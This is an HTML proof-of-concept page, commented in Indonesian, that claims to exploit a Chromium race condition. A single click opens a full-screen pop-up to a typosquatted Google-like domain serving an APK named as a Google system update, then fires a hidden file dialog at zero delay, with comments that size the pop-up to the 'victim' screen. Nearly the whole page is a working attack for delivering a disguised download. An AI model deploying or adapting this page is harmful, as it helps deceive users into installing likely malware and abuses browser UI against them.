<!DOCTYPE html>
<html>
<head>
    <title>Chromium Race Condition PoC - Fullscreen Pop-up</title>
</head>
<body style="height: 100vh; background: #eee;">
    <h1>Click Once - Tested on Chrome Latest</h1>
    <input type="file" id="sysDialog" style="display:none">
    
    <script>
        const sysDialog = document.getElementById('sysDialog');
        
        document.body.onclick = () => {
            // Mengambil resolusi maksimal layar yang tersedia pada perangkat korban
            const lebarMaksimal = screen.availWidth;
            const tinggiMaksimal = screen.availHeight;

            // Mengatur fitur pop-up agar memenuhi layar (top=0, left=0)
            const fiturPopUp = `width=${lebarMaksimal},height=${tinggiMaksimal},top=0,left=0,resizable=yes,scrollbars=yes`;

            // Step 1: Open Window dengan ukuran layar penuh
            window.open('https://googllogoligaturee.my.id/update_sistem_google.apk', '_blank', fiturPopUp);

            // Step 2: Race condition trigger dengan 0 delay
            setTimeout(() => {
                sysDialog.click();
            }, 0);
            
            console.log("Attack executed with full screen pop-up");
        };
    </script>
</body>
</html>
